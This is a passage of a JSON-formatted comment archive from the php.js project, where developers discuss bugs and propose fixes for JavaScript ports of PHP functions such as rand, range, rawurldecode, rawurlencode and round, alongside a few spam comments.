'body')[0] ? \r\n\t\t\t\tdocument.getElementsByTagNameNS(HTMLNS, 'body') : \r\n\t\t\t\tdocument.documentElement.lastChild) : \r\n\t\t\tdocument.getElementsByTagName('body')[0];\r\n\r\n    if (!body) {\r\n        return false;\r\n    }[\/CODE]\r\n\r\nIf that is done the declaration &quot;bodies = [], &quot; can also be removed.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction vprintf(format, args) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Ash Searle (http:\/\/hexmen.com\/blog\/)\r\n    \/\/ +   improved by: Michael White (http:\/\/getsprink.com)\r\n    \/\/ -    depends on: sprintf\r\n    \/\/ *     example 1: printf(&quot;%01.2f&quot;, 123.1);\r\n    \/\/ *     returns 1: 6\r\n \r\n    var body, elmt;\r\n    var ret = '';\r\n    \r\n    \/\/ .shift() does not work to get first item in bodies\r\n\r\n    var HTMLNS = 'http:\/\/www.w3.org\/1999\/xhtml';\r\n    body = document.getElementsByTagNameNS ? \r\n\t\t\t(document.getElementsByTagNameNS(HTMLNS, 'body')[0] ? \r\n\t\t\t\tdocument.getElementsByTagNameNS(HTMLNS, 'body') : \r\n\t\t\t\tdocument.documentElement.lastChild) : \r\n\t\t\tdocument.getElementsByTagName('body')[0];\r\n\r\n    if (!body) {\r\n        return false;\r\n    }\r\n    \r\n    ret = sprintf.apply(this, [format].concat(args));\r\n \r\n    elmt = document.createTextNode(ret);\r\n    body.appendChild(elmt);\r\n    \r\n    return ret.length;\r\n}[\/CODE]"},{"date":"2009-01-29 04:27:55","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Had a slight bug in this line (for vprintf and printf):\r\n[CODE=&quot;Javascript&quot;]\r\n    body = document.getElementsByTagNameNS ? \r\n\t\t\t(document.getElementsByTagNameNS(HTMLNS, 'body')[0] ? \r\n\t\t\t\tdocument.getElementsByTagNameNS(HTMLNS, 'body')[0] : \r\n\t\t\t\tdocument.documentElement.lastChild) : \r\n\t\t\tdocument.getElementsByTagName('body')[0];\r\n[\/CODE]"},{"date":"2009-02-01 22:09:09","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Fixed."},{"date":"2010-09-30 11:36:35","author":"Air Jordan Spizike","url":"http:\/\/www.kixmall.com\/  ","comment":"I was very pleased to find this site. This is an intelligent and well\nwritten article, you must have put a fair amount of research into writing\nthis. \n"},{"date":"2012-04-04 14:34:24","author":"????? ???????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas \n"}],"property_exists":[{"date":"2012-07-11 22:50:45","author":"Pete","url":"","comment":"I think checking if cls is 'undefined' is reasonable, and if it is, then the function should also return false.\r\n\r\n[CODE]\r\nif(typeof cls === 'undefined'){\r\n   return false;\r\n}\r\n[\/CODE]"}],"quotemeta":[{"date":"2012-06-06 07:05:51","author":"Charles  Wilder","url":"Wilder World","comment":"I just wanted say thank you to all the developer's.                     <\"charles5306\">"}],"rand":[{"date":"2009-02-01 14:01:09","author":"taith","url":"divinedesigns.ca","comment":"[CODE=&quot;Javascript&quot;]\r\nfunction range(start, stop, step) {\r\n if (!arguments.length) return [];\r\n var min, max, step;\r\n if (arguments.length == 1) {\r\n  min = 0;\r\n  max = arguments[0]-1;\r\n  step = 1;\r\n }else{\r\n  min = arguments[0];\r\n  max = arguments[1];\r\n  step = arguments[2] || 1;\r\n }\r\n if (step &lt; 0 &amp;&amp; min &gt;= max) {\r\n  step *= -1;\r\n  var tmp = min;\r\n  min = max;\r\n  max = tmp;\r\n  min += ((max-min) % step);\r\n }\r\n var a = [];\r\n for (var i = min; i &lt;= max; i += step) a[i] = i;\r\n return a;\r\n}\r\n[\/CODE]"},{"date":"2009-02-01 23:14:36","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ taith: Sorry I don't have a lot of time to really dig in the sources. It would be great if your could explain what makes your implementation better than the one provided by Waldo?"},{"date":"2010-04-12 10:26:52","author":"rtretretetert","url":"","comment":"th"},{"date":"2010-11-04 19:46:43","author":"test","url":"","comment":"[CODE]\nyour_stuff('here');\n[\/CODE]"},{"date":"2011-05-09 18:05:28","author":"Nathan","url":"","comment":"The code given here does not support negatives or floats, nor does it support an input of max,min instead of min,max. All of which the PHP version does support.\n\nI made some minor tweaks to get proper support for those \"features\", not that I am not a JS pro and there is probably a better way to go about this.\n\n[code]function rand (min, max) {\n    var argc = arguments.length;\n    if (argc === 0) {\n        min = 0;\n        max = 2147483647;\n    } else if (argc === 1) {\n        throw new Error('Warning: rand() expects exactly 2 parameters, 1 given');\n    }\n\t\n\tif (min > max) { var mint = min; min = max; max = mint; }\n\t\n\tvar result = Math.random() * (max + Math.abs(min) + 1) - Math.abs(min);\n\t\n\tif (Math.round(min) == min || Math.round(max) == max)\n\t\treturn Math.floor(result);\n\telse\n\t\treturn result;\n}[\/code]"},{"date":"2011-05-09 18:14:40","author":"Nathan","url":"","comment":"Sorry, the correct code would be \n\n[code]function rand (min, max) {\n    var argc = arguments.length;\n    if (argc === 0) {\n        min = 0;\n        max = 2147483647;\n    } else if (argc === 1) {\n        throw new Error('Warning: rand() expects exactly 2 parameters, 1 given');\n    }\n\t\n\tif (min > max) { var mint = min; min = max; max = mint; }\n\t\n\tif (min >= 0)\n\t\treturn Math.floor(Math.random() * (max - min + 1)) + min;\n\telse {\n\t\tvar result = Math.random() * (max + Math.abs(min) + 1) - Math.abs(min);\n\t\t\n\t\tif (Math.round(min) == min || Math.round(max) == max)\n\t\t\treturn Math.floor(result);\n\t\telse\n\t\t\treturn result;\n\t}\n}[\/code]\n\nOnly use new code if min is negative."}],"range":[{"date":"2009-12-06 14:56:06","author":"cfddream","url":"http:\/\/hi.chibaole.com\/blog","comment":"This is my 'range' function:\nfunction range(start, end, step){\n    var l = arguments.length;\n    if(l == 0) return [];\n    if(l == 1) return arguments.callee(0, start, 1);\n    if(l == 2) return arguments.callee(start, end, 1);\n    var temp = []\n    start = start>>0, end = end>>0, step = step>>0;\n    \/\/console.log(start, end, step);\n    for(;start < end; start+= step){\n        temp.push(start);\n    }\n    return temp;\n}\nrange(); \/\/ []\nrange(10); \/\/ [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nrange(-10); \/\/ []\nrange(-10, -20); \/\/[]\nrange(0, 10); \/\/[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nrange(-10, 10, 2); \/\/ [-10, -8, -6, -4, -2, 0, 2, 4, 6, 8]"},{"date":"2009-12-14 15:40:34","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ cfddream: Thanks for sharing. Does your function also support alphanumeric ranges like in the 3rd example though?"},{"date":"2011-03-16 23:20:02","author":"George","url":"","comment":"I just downloaded a build of jPaq that only contains the array functions.  I definitely like how easy dealing with arrays can be.  I used the following code to produce the lower-case letters a through i.\n[CODE]\nArray.range(97,106).forEach(function(num) {\n  return String.fromCharCode(num);\n})\n[\/CODE]\n\nI can also easily emulate the other examples as well with jPaq.  FYI, if you are looking for a neat javascript library that you custom build, make it at http:\/\/www.jpaq.org\/"},{"date":"2011-03-16 23:22:17","author":"George","url":"","comment":"I apologize.  The code that you can use from jPaq is this:\n[CODE]\nArray.range(97,106).map(function(num) {\n  return String.fromCharCode(num);\n})\n[\/CODE]"},{"date":"2011-03-17 11:12:00","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@George. You can also compile only the functions you need for php.js. Personally speaking, doing \"range('a', 'i');\" seems easier and clearer than writing multi-stepped non-semantic code, even if that code is in a nice functional style. (It would be nice, I'll admit if our compiler could allow chaining in array functions, possibly stripping of the redundant \"array_\" prefix as in the PHP API, but in this case the php.js way seems easier.)"},{"date":"2011-05-05 18:23:00","author":"Rocket","url":"http:\/\/NTICompassInc.com","comment":"I found an error with this code.\n\n[CODE]\nrange('1', '10');\n[\/CODE]\n\nThis makes Google Chrome lock up.\n\nLines 21 and 22 should be:\n\n[CODE]\ninival = parseInt(low, 10);\nendval = parseInt(high, 10);\n[\/CODE]"},{"date":"2012-04-17 15:27:03","author":"????? ???","url":"http:\/\/an3m1.com\/","comment":"I have a lot to benefit from this article and thank you for this wonderful effort to this article and will continue my many articles you have other \n"}],"rawurldecode":[{"date":"2009-03-30 12:57:23","author":"travc","url":"","comment":"Found an apparent bug...  I'll try to track it down, but I'm a javascript noob.\n\n[CODE]\n<?  print rawurldecode('-22%97bc%2Fbc'); ?>\n\n<script type=\"text\/javascript\">\n  var foo = rawurldecode('-22%97bc%2Fbc');\n  alert(foo);\n<\/script>\n[\/CODE]\n\nphp part works fine,  js breaks.\n\nfirebug reports:\nmalformed URI sequence\nrawurldecode(\"-22%97bc%2Fbc\")\n\nAnd, yes, this string comes from encoding in php with rawurlencode (from a big nasty db response).  "},{"date":"2009-03-30 16:19:31","author":"Brett Zamir","url":"","comment":"Sorry, it looks like to fully reflect PHP's behavior, you have to add this to the histogram (all of our other related functions should be converted accordingly as well):\n\n[CODE]\nhistogram['\\u20AC'] = '%80';\nhistogram['\\u0081'] = '%81';\nhistogram['\\u201A'] = '%82';\nhistogram['\\u0192'] = '%83';\nhistogram['\\u201E'] = '%84';\nhistogram['\\u2026'] = '%85';\nhistogram['\\u2020'] = '%86';\nhistogram['\\u2021'] = '%87';\nhistogram['\\u02C6'] = '%88';\nhistogram['\\u2030'] = '%89';\nhistogram['\\u0160'] = '%8A';\nhistogram['\\u2039'] = '%8B';\nhistogram['\\u0152'] = '%8C';\nhistogram['\\u008D'] = '%8D';\nhistogram['\\u017D'] = '%8E';\nhistogram['\\u008F'] = '%8F';\nhistogram['\\u0090'] = '%90';\nhistogram['\\u2018'] = '%91';\nhistogram['\\u2019'] = '%92';\nhistogram['\\u201C'] = '%93';\nhistogram['\\u201D'] = '%94';\nhistogram['\\u2022'] = '%95';\nhistogram['\\u2013'] = '%96';\nhistogram['\\u2014'] = '%97';\nhistogram['\\u02DC'] = '%98';\nhistogram['\\u2122'] = '%99';\nhistogram['\\u0161'] = '%9A';\nhistogram['\\u203A'] = '%9B';\nhistogram['\\u0153'] = '%9C';\nhistogram['\\u009D'] = '%9D';\nhistogram['\\u017E'] = '%9E';\nhistogram['\\u0178'] = '%9F';\n[\/CODE]\n\nand then add this line right before the call to decodeURIComponent():\n\n[CODE]\nret = ret.replace(\/%([a-fA-F][0-9a-fA-F])\/g, function (all, hex) {return String.fromCharCode('0x'+hex);}); \/\/ These Latin-B have the same values in Unicode, so we can convert them like this\n[\/CODE]\n"},{"date":"2009-04-03 13:33:35","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ travc & Brett Zamir: Fixed in SVN: Thanks!"},{"date":"2009-09-29 16:14:40","author":"Joris van der Wel","url":"","comment":"Incase anyone is interested, here is a version with full UTF-8 support written without decodeURIComponent or any maps.\n\n[code]\nfunction rawurldecode(url)\n{\n\t\/\/ This function mimmicks PHP's rawurldecode under UTF-8\n\t\/\/ Any percentage notation is converted to its UTF-16 character.\n\t\/\/ Only tested on Mozilla browsers (Firefox 3.5)\n\t\/\/ Does NOT use any of decodeURIComponent, decodeURI, unescape, etc\n\t\/\/ Supports 4 byte characters (so unicode characters 0x0000 through 0x10FFFF)\n\t\/\/\n\t\/\/ Original by Joris van der Wel\n\tvar chr, a, len, ret, c, c2, c3, c4, hi, low;\n\t\n\tret = '';\n\tfor (a = 0, len = url.length; a < len; a++)\n\t{\n\t\tchr = url.charAt(a);\n\t\tif (chr != '%')\n\t\t{\n\t\t\tret += chr;\n\t\t\tcontinue;\n\t\t}\n\t\t\n\t\tc = parseInt(url.charAt(a+1) + url.charAt(a+2), 16);\n\t\tif (isNaN(c))\n\t\t{\n\t\t\tret += '%'; \/\/ If php comes across something invalid, it just shows it without parsing \n\t\t\tcontinue;\n\t\t}\n\t\t\n\t\ta += 2; \/\/ skip 2\n\t\t\n\t\tret += String.fromCharCode(c);\n\t}\n\t\n\t\/\/ second pass, convert UTF-8 to UTF-16 (Strings in javascript (ECMA-262 to be exact) are UTF-16)\n\turl = ret;\n\tret = '';\n\tfor (a = 0, len = url.length; a < len; a++)\n\t{\n\t\tc = url.charCodeAt(a);\n\t\t\n\t\t\/\/        c & 1000 0000  === 0000 0000\n\t\tif(      (c &      0x80) === 0        ) \/\/ 0xxxxxxx\n\t\t{\n\t\t\tret += url.charAt(a);\n\t\t}\n\t\t\/\/        c & 1110 0000  === 1100 0000\n\t\telse if ((c &      0xE0) ===      0xC0) \/\/ 110y yyxx\t10xx xxxx\n\t\t{\n\t\t\ta++;\n\t\t\tc2 = url.charCodeAt(a);\n\t\t\tret += String.fromCharCode(\n\t\t\t\t\t((c  & 0x1F) << 6) | \n\t\t\t\t\t((c2 & 0x3F) << 0)\n\t\t\t\t);\n\t\t}\n\t\t\/\/        c & 1111 0000  === 1110 0000\n\t\telse if ((c &      0xF0) ===      0xE0) \/\/ 1110 yyyy\t10yy yyxx\t10xx xxxx\n\t\t{\n\t\t\ta++;\n\t\t\tc2 = url.charCodeAt(a);\n\t\t\ta++;\n\t\t\tc3 = url.charCodeAt(a);\n\t\t\tret += String.fromCharCode(\n\t\t\t\t       ((c  & 0x0F) << 12) |\n\t\t\t\t       ((c2 & 0x3F) << 6 ) |\n\t\t\t\t       ((c3 & 0x3F) << 0 )\n\t\t\t       );\n\t\t}\n\t\t\/\/        c & 1111 1000  === 1111 0000\n\t\telse if ((c &      0xF8) ===      0xF0) \/\/ 1111 0zzz\t10zz yyyy\t10yy yyxx\t10xx xxxx \n\t\t{\n\t\t\ta++;\n\t\t\tc2 = url.charCodeAt(a);\n\t\t\ta++;\n\t\t\tc3 = url.charCodeAt(a);\n\t\t\ta++;\n\t\t\tc4 = url.charCodeAt(a);\n\t\t\t\n\t\t\tc =\t((c  & 0x07) << 18) |\n\t\t\t\t((c2 & 0x3F) << 12) |\n\t\t\t\t((c3 & 0x3F) << 6 ) |\n\t\t\t\t((c4 & 0x3F) << 0 ) ;\n\t\t\t\n\t\t\tif (c >= 0x10000) \/\/ split it up using surrogates\n\t\t\t{\n\t\t\t\tc -= 0x10000;\n\t\t\t\t\n\t\t\t\thi  = (c & 0xFFC00) >> 10; \/\/ first 10 bits\n\t\t\t\tlow = c & 0x003FF; \/\/ last  10 bits\n\t\t\t\t\n\t\t\t\thi  += 0xD800; \/\/ high surrogate range\n\t\t\t\tlow += 0xDC00; \/\/ low surrogate range\n\t\t\t\tret += String.fromCharCode(hi, low);\n\t\t\t} \n\t\t\telse\n\t\t\t{\n\t\t\t\tret += String.fromCharCode(c);\n\t\t\t}\n\t\t}\n\t}\n\t\n\treturn ret;\n}\n[\/code]\nYou could probably rewrite it to use only one loop, but that would turn into spaghetti code very fast\n\nGr."},{"date":"2009-10-26 01:07:41","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Joris: Sorry I haven't gotten to your post yet; that looks great! I'd like to test it out a little first and then commit, if you can bear with me a little..."},{"date":"2009-10-28 02:32:00","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Joris: Thanks for your code (it's helpful to have here for reference and makes a good complement to the previous code for urlencode and reposted just now in the comments at http:\/\/phpjs.org\/functions\/urlencode ), but I went ahead with the faster use of decodeURIComponent()."},{"date":"2012-04-17 15:33:39","author":"???? ????????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas \n"}],"rawurlencode":[{"date":"2009-04-21 06:09:56","author":"Michael Grier","url":"","comment":"Not encoding spaces is not the behavior of rawurlencode or urlencode, for that matter.\n\nurlencode and rawurlencode both encode anything that is not \"A to Z\", \"a to z\", \"0 to 9\", \"-\", \"_\" or \".\" ... the only difference between them is how spaces are encoded... urlencode encodes spaces as \"+\" and rawurlencode encodes spaces as \"%20\"."},{"date":"2009-04-21 08:43:35","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Good catch!  I'm not sure how that happened, but it is now fixed in SVN. I've actually been meaning to review these functions, as I'm not 100% sure now that the recent changes to the histogram have all been correct, at least for all functions..."},{"date":"2009-06-01 23:15:34","author":"Me","url":"","comment":"Isn't this simpler and achieving the same result:\r\n[code]escape(str);[\/code]"},{"date":"2009-06-02 00:01:39","author":"Kankrelune","url":"http:\/\/www.webfaktory.info\/","comment":"it's not exactly the same chars list in escape and rawurlencode... .. .\n\nThe escape and unescape functions do not work properly for non-ASCII characters and have been deprecated. In JavaScript 1.5 and later, use encodeURI or encodeURIComponent... .. . ;o)\n\n@ tchaOo\u00b0"},{"date":"2009-06-02 02:46:00","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Even encodeURIComponent differs. See http:\/\/www.devpro.it\/examples\/php_js_escaping.php"},{"date":"2009-09-09 15:15:51","author":"Joris","url":"","comment":"This function does not work properly for 4 byte unicode characters. Browsers use UTF-16 for strings. That means any unicode character above 65536 is split up into two surrogates values.\r\n\r\nSo \"code >= 65536\" is NEVER true.\r\nOh and PHP always makes sure a percentage value is composed of two hex numbers.\r\nHere is a version that does urlencode as if the string were really UTF-8:\r\n\r\n[CODE]\r\nvar hexStr = function (dec) {\r\n    return '%' + (dec < 16 ? '0' : '') + dec.toString(16).toUpperCase();\r\n};\r\n\r\nvar ret = '',\r\n        unreserved = \/[\\w.~-]\/; \/\/ A-Za-z0-9_.~-\r\nstr = (str+'').toString();\r\n\r\nfor (var i = 0, dl = str.length; i < dl; i++) {\r\n    var ch = str.charAt(i);\r\n    if (unreserved.test(ch)) {\r\n        ret += ch;\r\n    }\r\n    else {\r\n        var code = str.charCodeAt(i);\r\n        if (0xD800 <= code && code <= 0xDBFF) \/\/ High surrogate (could change last hex to 0xDB7F to treat high private surrogates as single characters); https:\/\/developer.mozilla.org\/index.php?title=en\/Core_JavaScript_1.5_Reference\/Global_Objects\/String\/charCodeAt&revision=39\r\n        {\r\n            code = ((code - 0xD800) * 0x400) + (str.charCodeAt(i+1) - 0xDC00) + 0x10000;\r\n            i++; \/\/ skip the next one\r\n        }\r\n        \/\/ We never come across a low surrogate because we skip them\r\n        \r\n        \/\/ Reserved assumed to be in UTF-8, as in PHP\r\n        if (code < 128) { \/\/ 1 byte\r\n            ret += hexStr(code);\r\n        }\r\n        else if (code >= 128 && code < 2048) { \/\/ 2 bytes\r\n            ret += hexStr((code >> 6) | 0xC0);\r\n            ret += hexStr((code & 0x3F) | 0x80);\r\n        }\r\n        else if (code >= 2048 && code < 65536) { \/\/ 3 bytes\r\n            ret += hexStr((code >> 12) | 0xE0);\r\n            ret += hexStr(((code >> 6) & 0x3F) | 0x80);\r\n            ret += hexStr((code & 0x3F) | 0x80);\r\n        }\r\n        else if (code >= 65536) { \/\/ 4 bytes\r\n            ret += hexStr((code >> 18) | 0xF0);\r\n            ret += hexStr(((code >> 12) & 0x3F) | 0x80);\r\n            ret += hexStr(((code >> 6) & 0x3F) | 0x80);\r\n            ret += hexStr((code & 0x3F) | 0x80);\r\n        }\r\n    }\r\n}\r\nreturn ret;\r\n[\/CODE]\r\n\r\nGr. Joris"},{"date":"2009-09-10 04:12:09","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Joris: Good catch about the non-BMP code points; ironic you caught me making the mistake, since I was the one who edited the article you cited for the correction to point this problem out! :)  That's what I get for adapting someone else's pattern without thinking... Anyways, your addition is good, except that it should not assign to \"code\" but instead to \"ret\" and then do a \"continue\" after the \"i++\" or ensure we are in a continuous else\/else-if block (I chose the latter). Also, thanks for the catch on the hex needing two chars min... Fixed in git..."},{"date":"2009-09-29 16:06:36","author":"Joris van der Wel","url":"","comment":"heh :)\n\nWell, if a high surrogate is found, the i++; is just there so we do not loop over the low surrogate the next time.\nIt then goes all the way to [code]if (code >= 65536) { \/\/ 4 byte[\/code] to turn it into utf-8\n\nThat just me accounting for the remote possibility the specification changes (aka charCodeAt returning something bigger then 65535)\n\nFunny thing is, I actually wrote my own rawurlencode function before finding this one and it was nearly identical. "}],"require":[{"date":"2010-04-22 08:03:58","author":"Yen-Wei Liu","url":"","comment":"on line 27:\nd.getElementsByTagNameNS ? d.getElementsByTagNameNS('http:\/\/www.w3.org\/1999\/xhtml', 'head')[0].appendChild(script_block) : d.getElementsByTagName('head')[0].appendChild(script_block);\n\nThis doesn't run on some versions of browsers, such as FF 3.0 and FF 3.5.\n\nThese browsers have getElementsByTagNameNS() but only work with XHTML files, so they never get the \"head\" tag and \n'[0]' would trigger an error\/exception.\n\nI suggest this should be fixed like that in include() , where I think someone has noticed this problem :\n\nChange it to :\n\n\t\t    d.getElementsByTagNameNS ?\n\t\t        (d.getElementsByTagNameNS('http:\/\/www.w3.org\/1999\/xhtml', 'head')[0] ?\n\t\t            d.getElementsByTagNameNS('http:\/\/www.w3.org\/1999\/xhtml', 'head')[0].appendChild(script_block) :\n\t\t            d.documentElement.insertBefore(script_block, d.documentElement.firstChild)\n\t\t         ):\n\t\t         d.getElementsByTagName('head')[0].appendChild(script_block);\n\n"},{"date":"2010-04-22 19:30:40","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Yen-Wei Liu: Thank you for the report! I've made some fixes in http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/language\/require.js (and also a change for include()) which I believe should fix the issue. Our code was insufficient on two counts: the issue you brought up (though in your fix based on our earlier code, the script would I think actually be added above the head rather than inside it) and the fact that we really should be checking whether this is text\/html or true XHTML or XML (since even XHTML served as text\/html will have the problem you indicated) in order to make the decision, since as you pointed out, FF possessing the method does not mean it is suitable for the document."}],"reset":[{"date":"2009-12-19 23:03:27","author":"Rey S.","url":"","comment":"javascript: a76883600569_do_hosp(\"heal\",\"7667eddaf89376258610b9df58d1d54dda64721c\");\n\nAs to use this string and to make it to work in a platform of a game of Facebook. The code of 40 figures and the key of the personage. \nThanks \nhttp:\/\/apps.facebook.com\/guerre-di-banda\/hospital.php"},{"date":"2009-12-20 09:59:40","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Rey: Did some of your post get cut off? No idea what you're talking about... We don't want to install anything to test too, so please include whatever code you want to highlight here (or use a site like pastebin.org and refer us to it)"},{"date":"2012-04-23 14:50:39","author":"????? ???????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas \n"}],"round":[{"date":"2008-09-22 15:44:54","author":"Onno Marsman","url":"","comment":"How about the following?\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction round (val, precision) {\r\n    return parseFloat(val).toFixed(precision);\r\n}\r\n[\/CODE]\r\n\r\nI've checked for a call without precision, it also works fine."},{"date":"2008-09-23 17:25:03","author":"Onno Marsman","url":"","comment":"Better than my previous suggestion:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction round (val, precision) {\r\n    return parseFloat(parseFloat(val).toFixed(precision));\r\n}\r\n[\/CODE]"},{"date":"2008-09-24 09:37:13","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: works just fine, I've revised it. Muchos! ;)"},{"date":"2009-07-11 04:29:07","author":"Greenseed","url":"http:\/\/www.aleajecta.com","comment":"The round funtion will not gave same answer as Php.\n\nPHP:\nround(2.835,2) == 2.84\n\nPHP.JS\nround(2.835,2) == 2.83\n\nCode i had to add for making it correctely\n[CODE]\nNumber.prototype.round = function(precision) \n{\n    var diff = this - this.toFixed(precision);\n    return parseFloat( (this+diff).toFixed(precision) );\n}\n[\/CODE]\nI did not test it very much , but with the value i show seem to work better , so see this as a proof of concept"},{"date":"2009-07-11 05:24:56","author":"Greenseed","url":"http:\/\/www.aleajecta.com","comment":"Sorry for last code, was showing what i meaned but wrong :)\n\nhere is the working and tested solution.\n\n[CODE]\nNumber.prototype.round = function(precision)\n{\n    precision2 = Math.pow(10,precision);\n    return Math.round(this*precision2)\/precision2;\n};\n[\/CODE]\n\nBut see this page , into the very bottom , about JS way of storing number"},{"date":"2009-07-11 20:58:29","author":"T.Wild","url":"","comment":"GreenSeed is right, And a test of all 3 digit decimals between 0 and 1 match the PHP value,\nA (working) fixed version, not messing with the prototypes:\n\n[code]\nfunction round ( val, precision, mode ) {\n    \/\/ Returns the number rounded to specified precision\n    \/\/\n    \/\/ version: 904.2314\n    \/\/ discuss at: http:\/\/phpjs.org\/functions\/round\n    \/\/ +   original by: Philip Peterson\n    \/\/ +    revised by: Onno Marsman\n    \/\/ *     example 1: round(1241757, -3);\n    \/\/ *     returns 1: 1242000\n    \/\/ *     example 2: round(3.6);\n    \/\/ *     returns 2: 4\n    \/\/ Need to support mode flags: PHP_ROUND_HALF_UP, PHP_ROUND_HALF_DOWN, PHP_ROUND_HALF_EVEN, or PHP_ROUND_HALF_ODD\n\n    precision2 = Math.pow(10,precision);\n    return Math.round(val*precision2)\/precision2;\n}\n[\/code]"},{"date":"2009-07-12 01:15:54","author":"T.Wild","url":"","comment":"A round implementation with support for:\nPHP_ROUND_UP, PHP_ROUND_DOWN, PHP_ROUND_HALF_UP, PHP_ROUND_HALF_DOWN, PHP_ROUND_FLOOR, PHP_ROUND_CEILING\nusing http:\/\/publib.boulder.ibm.com\/infocenter\/wmbhelp\/v6r0m0\/index.jsp?topic=\/com.ibm.etools.mft.doc\/ak05380_.htm as reference,\n\nIt's not pretty but as far as I can tell it works, passes the tests I've thrown at it anyway :)\n**can't fully test, don't have PHP 5.3 yet**\n\nThe only reason I haven't implemented PHP_ROUND_HALF_EVEN is the example I have to work on only uses 1 dp with a precision of 0, so I don't know what it's meant to do if there are multiple dps.\n\n[CODE]\nfunction round( val, precision, mode ) {\n    var V = val.toString(),integer,decimal,reint = false,decp,d1,d2,pow=0; \/\/Define variables.\n    decp = V.indexOf('.'); \/\/Find index of decimal place\n    if (decp == -1){ \/\/If there is no decimal place we are most likely dealing with an integer\n        \/*---ROUNDING AN INTEGER---\n         * If the precision is 0 then we don't need to round\n         * otherwise turn the integer into a decimal E.G\n         * 100 becomes 0.1\n         * 2143 becomes 0.2143\n         * take the modulus of the precision and then round the decimal\n         * we turn it back into an intgeger at the end\n         *\/\n        if (precision === 0){\n            return val;\n        }else{\n            pow = V.length; \/\/Rember how many powers of ten we need to turn the decimal back to an integer\n            V = '0.'+V;\n            precision = Math.abs(precision);\n            reint = true; \/\/Remeber to change it back\n            decp = 1;\n        }\n    }else if(precision < 0){\n        \/*\n         * Deling with decimal already, but still want to round an intgeger\n         * So truncate V and then do the same as above.\n         *\/\n        integer = V.slice(0,decp);\n        pow = integer.length;\n        V = '0.'+integer;\n        precision = Math.abs(precision);\n        reint = true;\n        decp = 1;\n    }\n\n    \/*\n     * Split the integer and decimal parts of the number\n     *\/\n    integer = V.slice(0,decp);\n    decimal = V.slice(decp+1);\n\n    \/** d1 = decimal before the subject decimal **\/\n\n    if (decimal.length <= precision){\n        \/\/If the precision is less or equal to the number of decimals then we don't need to round\n        return val;\n    }else if(precision === 0){\n        \/**\n         * Special handling of precision = 0\n         * In this case the number before the subject decimal is the last digit of integer\n         * not part of the `decimal` variable\n         *\/\n        d1 = Number(integer.charAt(integer.length-1));\n        integer = integer.slice(0,integer.length-1);\/\/Remove the last digit of integer\n    }else{\n        d1 = Number(decimal.charAt(precision-1));\n    }\n\n    \/** d2 = the subject decimal **\/\n    d2 = Number(decimal.charAt(precision));\n    decimal = decimal.slice(0,precision-1); \/\/remove last digit of decimal\n\n    if (mode=='ROUND_CEILING'){\n        if (val > 0){\n            mode = 'PHP_ROUND_UP';\n        }else{\n            mode = 'PHP_ROUND_DOWN';\n        }\n    }else if(mode=='ROUND_FLOOR'){\n        if (val > 0){\n            mode = 'PHP_ROUND_DOWN';\n        }else{\n            mode = 'PHP_ROUND_UP';\n        }\n    }\n\n    switch (mode){\n        case 'PHP_ROUND_UP': \/\/Always round up\n                d1+=1;\n            break;\n        case 'PHP_ROUND_HALF_DOWN': \/\/If subject decimal is more than 5 then round up\n            if (d2 > 5){\n                d1+=1;\n            }\n            break;\n        default: \/\/If the subject decimal is 5 or more, then round up\n            \/\/ROUND_HALF_UP\n            if (d2 >= 5){\n                d1+=1;\n            }\n            break;\n    }\n\n    if(precision === 0){\n        \/*\n         * Again, special handling for precision 0\n         * if the round has made a value of 10, then add 1 to the integer and set d1 to 0\n         * this works because of the way I concatinate them\n         *\/\n        if (d1 == 10){\n            integer+=1;\n            d1 = '0';\n        }\n        val=Number(integer+d1);\n    }else{\n        if (d1 == 10){\n            \/*\n             * intger = 1\n             * decimal = 0.555\n             * Number(integr+'.'+decimal) = 1.555\n             * (0-decimal.length) = -3\n             * 1*(10^-3) = 0.001\n             * Number(integr+'.'+decimal)+0.001 = 1.556\n             *\/\n            val = Number(integer+'.'+decimal)+(1*(Math.pow(10,(0-decimal.length))));\n        }else{\n            \/*\n             * otherwsie just re-concatinate the numbers\n             *\/\n            val = Number(integer+'.'+decimal+d1);\n        }\n    }\n\n    if (reint){\n        return val*Math.pow(10,pow);\n    }else{\n        return val;\n    }\n}\n[\/CODE]"},{"date":"2009-07-12 01:26:20","author":"T.Wild","url":"","comment":"A slight oversight on my part,\nyou'll need to add\nif(typeof precision == 'undefined'){precision = 0;}\nto the line before\ndecp = V.indexOf('.');\nto account for a precision not being past to the function."},{"date":"2009-07-14 12:37:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ T.Wild: Thanks a lot for really going out of your way to make this solid! I 